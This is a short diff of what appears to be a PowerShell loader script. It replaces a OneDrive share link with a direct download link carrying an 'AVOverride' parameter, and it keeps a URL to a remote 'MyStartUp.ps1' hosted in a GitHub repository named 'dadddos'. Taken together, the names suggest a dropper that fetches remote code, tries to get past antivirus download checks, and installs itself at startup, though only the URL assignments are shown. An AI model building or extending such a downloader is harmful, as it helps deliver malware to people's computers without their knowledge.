@@ -1,4 +1,4 @@
-$downloadUrl = "https://1drv.ms/u/s!ArxrwmL8xQdGgQV7HM9vEVNWf4rj?e=IZdCcH"
+$downloadUrl = "https://public.dm.files.1drv.com/y4mfd1vbTWS87sihRRAsxxN4pQYL8TXMnufxMu7NL3HPSjb041nAO9rq0Szn0S5rh9k1jjycgkddVf5yu3l7KCiONG7UhLA-h_7Asrh0p5gRld-ddNbahj7oTCMPBH82ozEDIZr5plzKDkwa5Ky3Nss5gfyxtw8vo96zY8JVZhjxYxUjvsbv6XarsCVXCOS-MA9ezwVi7Xf8eq50ZZJQTwlBcMp32CKE_w5EtHDSM5XsCs?AVOverride="
 $down = "https://raw.githubusercontent.com/fullcaleta/dadddos/main/MyStartUp.ps1"
 
 
